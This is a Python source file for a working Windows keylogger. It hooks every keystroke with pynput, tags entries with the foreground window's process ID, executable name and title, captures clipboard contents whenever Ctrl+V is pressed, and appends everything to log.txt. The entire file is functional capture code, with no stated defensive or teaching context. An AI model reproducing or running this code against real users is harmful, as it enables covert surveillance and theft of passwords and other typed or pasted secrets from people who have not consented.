from pynput import keyboard
import win32clipboard
from ctypes import windll, byref, create_unicode_buffer, c_ulong
import sys
import os

class KeyLogger:
    def __init__(self):
        self.current_window = None
        self.user32 = windll.user32
        self.kernel32 = windll.kernel32
        self.psapi = windll.psapi

    def get_current_process(self):
        hwnd = self.user32.GetForegroundWindow()
        pid = c_ulong(0)
        self.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        
        executable = create_unicode_buffer(512)
        h_process = self.kernel32.OpenProcess(0x400 | 0x10, False, pid)
        self.psapi.GetModuleBaseNameW(h_process, None, byref(executable), 512)
        
        window_title = create_unicode_buffer(512)
        self.user32.GetWindowTextW(hwnd, byref(window_title), 512)
        
        new_window = window_title.value
        exec_name = executable.value
        
        if new_window != self.current_window:
            self.current_window = new_window
            header = f"\n\n[ PID: {pid.value} - {exec_name} - {self.current_window} ]\n"
            print(header, end='')
            with open("log.txt", "a", encoding="utf-8") as f:
                f.write(header)
        
        self.kernel32.CloseHandle(h_process)

    def on_press(self, key):
        self.get_current_process()
        
        try:
            content = ""
            if hasattr(key, 'char') and key.char is not None:
                content = key.char
            else:
                key_str = str(key).replace('Key.', '')
                if key == keyboard.KeyCode.from_char('\x16'):
                    try:
                        win32clipboard.OpenClipboard()
                        value = win32clipboard.GetClipboardData()
                        win32clipboard.CloseClipboard()
                        content = f"\n[PASTE] - {value}\n"
                    except Exception:
                        content = " [PASTE ERROR] "
                else:
                    content = f" [{key_str}] "
            
            print(content, end='', flush=True)

            with open("log.txt", "a", encoding="utf-8") as f:
                f.write(content)

        except Exception as e:
            error_msg = f" [Error: {e}] "
            print(error_msg, end='', flush=True)
            with open("log.txt", "a", encoding="utf-8") as f:
                f.write(error_msg)

    def run(self):
        print("Monitoring started... (Press Ctrl+C to stop)")
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

if __name__ == '__main__':
    logger = KeyLogger()
    try:
        logger.run()
    except KeyboardInterrupt:
        print("\nThe monitoring has been stopped.")
        sys.exit()